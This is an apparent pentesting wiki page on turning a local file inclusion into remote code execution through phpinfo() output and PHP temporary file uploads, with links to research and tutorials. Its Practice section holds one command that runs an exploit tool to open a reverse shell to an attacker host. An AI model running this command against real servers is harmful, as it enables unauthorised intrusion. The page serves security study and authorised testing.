# PHPInfo

## Theory

When `file_uploads=on` is set in the PHP configuration file, it is possible to upload a file by POSTing it on any PHP file ([RFC1867](https://www.ietf.org/rfc/rfc1867.txt)). This file is put to a temporary location on the server and deleted after the HTTP request is fully processed.

The aim of the attack is to POST a PHP reverse shell on the server and delay the processing of the request by adding very long headers to it. This gives enough time to find out the temporary location of the reverse shell using the output of the `phpinfo()` function and including it via the LFI before it gets removed. See the [insomnia researche paper](https://insomniasec.com/downloads/publications/LFI%20With%20PHPInfo%20Assistance.pdf) for more details

{% hint style="info" %}
The prerequisites for this method are :&#x20;

* having `file_uploads=on` set in the PHP configuration file
* having access to the output of the `phpinfo()` function
{% endhint %}

## Practice

We can use the [lfito\_rce](https://github.com/roughiz/lfito\_rce) to exploit it

```bash
#There is no requirements.txt, the dependencies have to be installed manually
python lfito_rce.py -l "http://$URL/?page=" --lhost=$attackerIP --lport=$attackerPORT -i "http://$URL/phpinfo.php"
```

## Resources

{% embed url="https://www.thehacker.recipes/web/inputs/file-inclusion/lfi-to-rce/phpinfo" %}

{% embed url="https://book.hacktricks.xyz/pentesting-web/file-inclusion/lfi2rce-via-phpinfo" %}
